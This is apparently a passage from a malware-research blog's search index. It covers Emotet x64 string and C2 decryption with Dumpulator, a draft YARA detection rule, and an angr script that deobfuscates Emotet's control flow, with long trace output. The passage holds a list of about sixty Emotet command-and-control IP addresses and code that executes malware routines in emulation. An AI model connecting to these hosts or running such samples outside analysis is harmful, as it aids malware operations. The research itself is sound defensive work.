xb28*{9F xb9 x1fPU#Q&#39;m xb9 x1f xad xc5: x02&#39;m xb9 x1f= xf4 xcd xe8&#39;m xb9 x1fu xacN x8e&#39;m xb9 x1f x94 x95B x84&#39;m xb9 x1f n xe3 x91 xda&#39;m xb9 x1f x95)x xe7&#39;m xb9 x1f x0b xa6 xf5G&#39;m xb9 x1f xfd x0f/ xea&#34; b&#39;b01f495a01bb00012d4c9fd61f9000018ac5936501bb000168a89a4f1f9000019538831c1f900001050974f61f9000014d51f7901f900001ac68fb9a1f900001321e28c41f900001add4c1f91f900001335b4c591f900001c5f296f41f900001674bc90201bb000133fe8cee1ba800014f8923c61f900001480fc90f1f9000011b36593a1f900001bd7e6fc81ba80001c4da1e5301bb000152a5987f1f900001a44463031f900001b76fe3891f900001a7acfda21f900001997e92191ba8000181e8bc5d01bb0001976a70c41f900001bc2c141901bb0001a76373231f900001867a42c11f900001b90487a51f900001d41862631f900001335b07051f900001923be22d01bb0001836418e700500001d4ed11631f900001c95ea6a201bb00012db0e87c01bb00019f41580a1f900001a0108e381f900001d89ee2ce01bb0001cb726d7c01bb0001672b2eb601bb00012e37de0b01bb0001d17e62ce1f9000015bcf1c211f90000101ea02e81f9000012d7673631f900001cebd1cc71f9000015e172d56102f00019e45de6501bb000167461c661f9000016532005b1f9000013ae32aec0050000177c17c291ba800016bb6e18e1f900001b99d52d31f9000012deb081e1f9000016784f21a1f90000101ea15491ba800016ee875ba1f900001d161a3d601bb0001b908d4821ba80001d1faf6ce01bb0001&#39; == C2 List== 176.31.73.90:443 45.76.159.214:8080 138.197.147.101:443 104.168.154.79:8080 149.56.131.28:8080 5.9.116.246:8080 77.81.247.144:8080 172.104.251.154:8080 50.30.40.196:8080 173.212.193.249:8080 51.91.76.89:8080 197.242.150.244:8080 103.75.201.2:443 51.254.140.238:7080 79.137.35.198:8080 72.15.201.15:8080 27.54.89.58:8080 189.126.111.200:7080 196.218.30.83:443 82.165.152.127:8080 164.68.99.3:8080 183.111.227.137:8080 167.172.253.162:8080 153.126.146.25:7080 129.232.188.93:443 151.106.112.196:8080 188.44.20.25:443 167.99.115.35:8080 134.122.66.193:8080 185.4.135.165:8080 212.24.98.99:8080 51.91.7.5:8080 146.59.226.45:443 131.100.24.231:80 212.237.17.99:8080 201.94.166.162:443 45.176.232.124:443 159.65.88.10:8080 160.16.142.56:8080 216.158.226.206:443 203.114.109.124:443 103.43.46.182:443 46.55.222.11:443 209.126.98.206:8080 91.207.28.33:8080 1.234.2.232:8080 45.118.115.99:8080 206.189.28.199:8080 94.23.45.86:4143 158.69.222.101:443 103.70.28.102:8080 101.50.0.91:8080 58.227.42.236:80 119.193.124.41:7080 107.182.225.142:8080 185.157.82.211:8080 45.235.8.30:8080 103.132.242.26:8080 1.234.21.73:7080 110.232.117.186:8080 209.97.163.214:443 185.8.212.130:7080 209.250.246.206:443 . Binary Exploration with Dumpulator . Using Dumpultor . First we load the sample in x64dbg | Install mindump plugin | Then run to entrypoint of the DLL | Run mindump from the x64dbg command bar MiniDump &lt;output_file.dmp&gt; | . from dumpulator import Dumpulator DUMP_FILE = &#39;/tmp/work/emotet_b481.dmp&#39; dp = Dumpulator(DUMP_FILE, quiet=True) . def decrypt_string(string_address): fn_decrypt = 0x07FFEA424B924 result = dp.call(fn_decrypt, [0x9695E, string_address, 0xD71EB]) ptxt_string = dp.read(result, 200) out = ptxt_string.split(b&#39; x00 x00&#39;)[0].replace(b&#39; x00&#39;,b&#39;&#39;) return bytes(out).decode(&#39;utf-8&#39;) blob_1 = 0x007FFEA4231000 ptxt_string = decrypt_string(blob_1) print(ptxt_string) . %s%s.exe . Generate a Yara Rule . Hunting Traints . These are data that might be useful for hunting related samples, but not great for non-fp identification of Emotet . internal name Y.dll | export DllRegisterServer | . String decryption loop . .text:00007FFEA424BAB9 C1 E9 10 shr ecx, 10h .text:00007FFEA424BABC 66 C1 E8 08 shr ax, 8 . Robust Rule Traits . We know that the .text and .data sections start with encrypted data that is in a set format: &lt;DWORD:key&gt;&lt;DWORD:encrypted len&gt;. We also know that that encrypted length is XOR encrypted with the key. We can exploit this info combined with the fact that the encrypted data length is not going to be more than 255 for the strings in .text or 65536 for the c2 table in .data. This tells us that most significant 2-bytes or 3-bytes will be equal for the key and the encrypted length. . Our yara rule will just compare these bytes and also make sure that they are no null bytes. . This might be good, but we don&#39;t know??? Some considerations: . if there are common PE files that have repeating bytes at the start of both section this could cause a lot of FPs we should test | . yara import &quot;pe&quot; rule Emotetx64 { condition: pe.is_64bit() and uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 2) == uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 6) and uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 2) != 0 and uint8(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset) != uint8(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 4) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 1) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 5) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 1) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 2) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 6) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 2) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 3) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 7) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 3) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset) != uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 4) } . data = b&#39; xAA x8B xDA x35 xA2 x8B xDA x35 x8F xF8 xFF x46 x84 xEE xA2 x50 x67 x9B x33 xDD xF6 xE0&#39; key = b&#39; xAA x8B xDA x35&#39; data_len = b&#39; xA2 x8B xDA x35&#39; .",
            "url": "https://research.openanalysis.net/emotet/malware/2022/04/30/emotet_x64.html",
            "relUrl": "/emotet/malware/2022/04/30/emotet_x64.html",
            "date": " • Apr 30, 2022"
        }
        
    
  
    
        ,"post12": {
            "title": "Emotet Deobfuscation Generic Solution",
            "content": "Overview . We have updated our algorithm to hadle the CFG normalization and to handle branching within a state (no part of the dispatcher). . References . IDA IL-only Emotet Deobfuscation Tool | . import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) # maintain a state counter state_count = 0 # maintain a list of entry bb for states entry_bb_list = [] # bb_tree[bb_address] = {states[], end, children=[] } bb_tree = {} # Use a queue for BFS # The queue contains state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state} q = Queue() # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; # Start angr project project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Setup function initial state on queue initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) state_count += 1 state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state} entry_bb_list.append(fn_start) q.put(state_info) # Walk the queue while not q.empty(): state_info = q.get() state_value = state_info.get(&#39;state_value&#39;) sim_state = state_info.get(&#39;sim_state&#39;) bb_address = sim_state.block().addr bb_end_address = bb_address + sim_state.block().size print(f&quot; n============================== n&quot;) print(f&quot;BB: {hex(bb_address)} - {hex(bb_end_address)}&quot;) print(f&quot; t State Value: {state_value}&quot;) # If we have already processed this bb for the same state disregard it if bb_address in bb_tree: if state_value in bb_tree[bb_address].get(&#39;states&#39;): print(f&quot; t !! Already processed for this state - END !!&quot;) continue # Get successors successors = project.factory.successors(sim_state) # Get children children = [s.addr for s in successors] print(f&quot; t Children:&quot;) for c in children: print(f&quot; t t {hex(c)}&quot;) # Add info to bb tree if bb_address in bb_tree: bb_tree[bb_address][&#39;states&#39;].append(state_value) bb_tree[bb_address][&#39;children&#39;] += children else: bb_tree[bb_address] = {&#39;states&#39;:[state_value], &#39;end&#39;:bb_end_address, &#39;children&#39;:children } # Generate the successors and push them onto the queue for successor in successors: print(f&quot; n t Successor: {hex(successor.addr)}&quot;) if not successor.regs.get(state_register).uninitialized: # If STATE is set reset the sim_state # Set clean sim_state new_sim_state = project.factory.blank_state(addr=successor.addr) new_sim_state.options.add(angr.options.CALLLESS) for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: if reg_name != state_register: new_sim_state.memory.store(new_sim_state.regs.get(reg_name), successor.regs.get(reg_name)) # Add to queue state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:new_sim_state} q.put(state_info) print(f&quot; t t STATE registers set - reset sim state&quot;) print(f&quot; t t Added to queue -&gt;&quot;) else: # If constraints for successor include == STATE # check if we have already seen the successor in entry_bb_list if we have don&#39;t push it else add it flag_queue_successor = True state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:successor} for constraint in successor.solver.constraints: for constraint_variable in constraint.variables: if &#39;reg_&#39;+ state_register in constraint_variable: if constraint.op == &#39;__eq__&#39;: print(f&quot; t t State entry bb found!&quot;) # This is a state entry bb if successor.addr in entry_bb_list: # if it is already in entry_bb_list then don&#39;t add it to the queue flag_queue_successor = False print(f&quot; t t t Already processed this state - END!&quot;) else: # Setup new entry state for queue new_state_value = state_count state_count += 1 # Set clean sim_state new_sim_state = project.factory.blank_state(addr=successor.addr) new_sim_state.options.add(angr.options.CALLLESS) for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: if reg_name != state_register: new_sim_state.memory.store(new_sim_state.regs.get(reg_name), successor.regs.get(reg_name)) state_info = {&#39;state_value&#39;:new_state_value, &#39;sim_state&#39;:new_sim_state} entry_bb_list.append(successor.addr) print(f&quot; t t t New state: {new_state_value}&quot;) if flag_queue_successor: print(f&quot; t t Added to queue -&gt;&quot;) # If we are ok to add the successor to the queue add it now q.put(state_info) print(&quot;** Completed initial analysis **&quot;) # Normalize bb_tree and combine states for overlapping blocks # Basic block normalization # If there is a jmp to the middle of a bb angr doesn&#39;t split it into two bb, this causes issues where a &quot;single&quot; bb # in the view of anger is actually two different types of bb # To normalize these what we need to do is split the bottom parts off the any non-normalized bb and set the type of # the top part of the block to be the same as the previous block # bb_tree[bb_address] = {states[], end, children=[] } # Sort the bb by address bb_tree_sorted = {key:bb_tree[key] for key in sorted(bb_tree.keys())} # For each bb search for bb that end after it and truncate them # Also update their type to match the previous type for bb_address in bb_tree_sorted: bb_tree_sorted[bb_address][&#39;children&#39;] = list(set(bb_tree_sorted[bb_address][&#39;children&#39;])) for ptr in bb_tree_sorted: if ptr &gt;= bb_address: # We have passed our bb, not more potential unnormalized bb for this address break if bb_address &lt; bb_tree_sorted[ptr].get(&#39;end&#39;): # Truncate the block bb_tree_sorted[ptr][&#39;end&#39;] = bb_address # Update the truncated block children with only next block bb_tree_sorted[ptr][&#39;children&#39;] = [bb_address] # Update the overlapped block states by combining both state lists bb_tree_sorted[bb_address][&#39;states&#39;] = list(set(bb_tree_sorted[bb_address][&#39;states&#39;] + bb_tree_sorted[ptr][&#39;states&#39;])) # Print sorted bb_tree for bb_address in bb_tree_sorted: print(f&quot;{hex(bb_address)} - States: {bb_tree_sorted[bb_address].get(&#39;states&#39;)} Children: {[hex(c) for c in set(bb_tree_sorted[bb_address].get(&#39;children&#39;))]} &quot;) # Walk bb_tree and group bb by state, identify state end blocks # bb_state_map[addr] = {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548} bb_state_map = {} for bb_address in bb_tree_sorted: if len(bb_tree_sorted[bb_address][&#39;children&#39;]) == 0: # This is an end block mark it as obb bb_state_map[bb_address] = {&#39;is_obb&#39;: True, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} elif len(bb_tree_sorted[bb_address][&#39;states&#39;]) == 1: # This is an obb bb_state_map[bb_address] = {&#39;is_obb&#39;: True, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} else: bb_state_map[bb_address] = {&#39;is_obb&#39;: False, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} . ============================== BB: 0x10008784 - 0x10008914 State Value: 0 Children: 0x10008914 Successor: 0x10008914 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10008914 - 0x10008aa1 State Value: 0 Children: 0x10008aa1 Successor: 0x10008aa1 Added to queue -&gt; ============================== BB: 0x10008aa1 - 0x10008c31 State Value: 0 Children: 0x10008c31 Successor: 0x10008c31 Added to queue -&gt; ============================== BB: 0x10008c31 - 0x10008dbb State Value: 0 Children: 0x10008dbb Successor: 0x10008dbb Added to queue -&gt; ============================== BB: 0x10008dbb - 0x10008f47 State Value: 0 Children: 0x10008f47 Successor: 0x10008f47 Added to queue -&gt; ============================== BB: 0x10008f47 - 0x100090d0 State Value: 0 Children: 0x100090d0 Successor: 0x100090d0 Added to queue -&gt; ============================== BB: 0x100090d0 - 0x1000925d State Value: 0 Children: 0x1000925d Successor: 0x1000925d Added to queue -&gt; ============================== BB: 0x1000925d - 0x100093e6 State Value: 0 Children: 0x100093e6 Successor: 0x100093e6 Added to queue -&gt; ============================== BB: 0x100093e6 - 0x10009555 State Value: 0 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 0 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! New state: 1 Added to queue -&gt; Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 0 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! New state: 2 Added to queue -&gt; Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009863 - 0x1000988a State Value: 1 Children: 0x1000988a Successor: 0x1000988a Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 0 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! New state: 3 Added to queue -&gt; Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100099c1 - 0x100099d2 State Value: 2 Children: 0x10009549 Successor: 0x10009549 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 0 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! New state: 4 Added to queue -&gt; Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000988a - 0x10009894 State Value: 1 Children: 0x1000953a Successor: 0x1000953a Added to queue -&gt; ============================== BB: 0x100097cd - 0x100097e6 State Value: 3 Children: 0x100097e6 Successor: 0x100097e6 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 0 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! New state: 5 Added to queue -&gt; Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 2 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100098e8 - 0x10009904 State Value: 4 Children: 0x10009904 Successor: 0x10009904 Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 0 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! New state: 6 Added to queue -&gt; Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000953a - 0x10009555 State Value: 1 Children: 0x10009555 Successor: 0x10009555 Added to queue -&gt; ============================== BB: 0x100097e6 - 0x10009830 State Value: 3 Children: 0x10009830 Successor: 0x10009830 Added to queue -&gt; ============================== BB: 0x10009713 - 0x10009732 State Value: 5 Children: 0x10009732 Successor: 0x10009732 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 0 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! New state: 7 Added to queue -&gt; Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 2 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 2 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009904 - 0x1000998c State Value: 4 Children: 0x1000998c Successor: 0x1000998c Added to queue -&gt; ============================== BB: 0x100098ac - 0x100098d8 State Value: 6 Children: 0x100098d8 Successor: 0x100098d8 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 0 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! New state: 8 Added to queue -&gt; Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 1 Children: 0x1000955b Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009830 - 0x1000985b State Value: 3 Children: 0x1000985b Successor: 0x1000985b STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10009732 - 0x10009750 State Value: 5 Children: 0x10009750 Successor: 0x10009750 Added to queue -&gt; ============================== BB: 0x100095a9 - 0x100095c2 State Value: 7 Children: 0x100095c2 Successor: 0x100095c2 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 0 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! New state: 9 Added to queue -&gt; Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 2 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 2 Children: 0x100098a4 Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000998c - 0x10009998 State Value: 4 Children: 0x10009998 0x1000999f Successor: 0x10009998 Added to queue -&gt; Successor: 0x1000999f Added to queue -&gt; ============================== BB: 0x100098d8 - 0x100098e8 State Value: 6 Children: ============================== BB: 0x100099d2 - 0x100099d7 State Value: 8 Children: 0x100098db Successor: 0x100098db Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 0 Children: 0x10009894 Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 1 Children: 0x10009563 Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x1000985b - 0x10009863 State Value: 3 Children: 0x100096fa Successor: 0x100096fa Added to queue -&gt; ============================== BB: 0x10009750 - 0x1000977e State Value: 5 Children: 0x1000977e Successor: 0x1000977e Added to queue -&gt; ============================== BB: 0x100095c2 - 0x100095e3 State Value: 7 Children: 0x100095e3 Successor: 0x100095e3 Added to queue -&gt; ============================== BB: 0x1000957b - 0x10009595 State Value: 9 Children: 0x10009595 Successor: 0x10009595 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 0 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 2 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 2 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009998 - 0x1000999f State Value: 4 Children: 0x100099a4 Successor: 0x100099a4 Added to queue -&gt; ============================== BB: 0x1000999f - 0x100099ba State Value: 4 Children: 0x100099ba Successor: 0x100099ba STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100098db - 0x100098e8 State Value: 8 Children: ============================== BB: 0x10009894 - 0x100098a0 State Value: 0 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 1 Children: 0x1000956f Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100096fa - 0x10009713 State Value: 3 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000977e - 0x100097af State Value: 5 Children: 0x100097af Successor: 0x100097af STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100095e3 - 0x10009615 State Value: 7 Children: 0x10009615 Successor: 0x10009615 Added to queue -&gt; ============================== BB: 0x10009595 - 0x100095a9 State Value: 9 Children: 0x1000953a Successor: 0x1000953a STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 2 Children: 0x10009573 Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 2 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100099a4 - 0x100099ba State Value: 4 Children: 0x100099ba Successor: 0x100099ba Added to queue -&gt; ============================== BB: 0x100099ba - 0x100099c1 State Value: 4 Children: 0x100096fa Successor: 0x100096fa Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 1 Children: 0x10009573 Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100097af - 0x100097c5 State Value: 5 Children: 0x100097c5 Successor: 0x100097c5 Added to queue -&gt; ============================== BB: 0x10009615 - 0x100096a2 State Value: 7 Children: 0x100096a2 Successor: 0x100096a2 Added to queue -&gt; ============================== BB: 0x1000953a - 0x10009555 State Value: 9 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 2 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 2 !! Already processed for this state - END !! ============================== BB: 0x100099ba - 0x100099c1 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x100096fa - 0x10009713 State Value: 4 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 1 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 3 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100097c5 - 0x100097cd State Value: 5 Children: 0x100096f5 Successor: 0x100096f5 Added to queue -&gt; ============================== BB: 0x100096a2 - 0x100096d6 State Value: 7 Children: 0x100096d6 Successor: 0x100096d6 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 9 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 9 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 2 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 1 Children: 0x10009549 Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 3 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 3 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100096f5 - 0x10009713 State Value: 5 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100096d6 - 0x100096f2 State Value: 7 Children: 0x100096f2 Successor: 0x100096f2 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 9 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 9 Children: 0x100098a4 Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 4 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 1 Children: 0x10009555 Successor: 0x10009555 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 3 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 3 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100096f2 - 0x10009713 State Value: 7 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 9 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 9 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 4 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 4 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 1 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 3 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 3 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 5 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 9 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 9 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 4 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 4 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 3 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 !! Already processed for this state - END !! ============================== BB: 0x10009555 - 0x1000955b State Value: 5 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 5 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 7 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 9 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 9 Children: 0x10009894 Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 4 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 4 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 3 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! Already processed this state - END! Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 5 Children: 0x100097cd 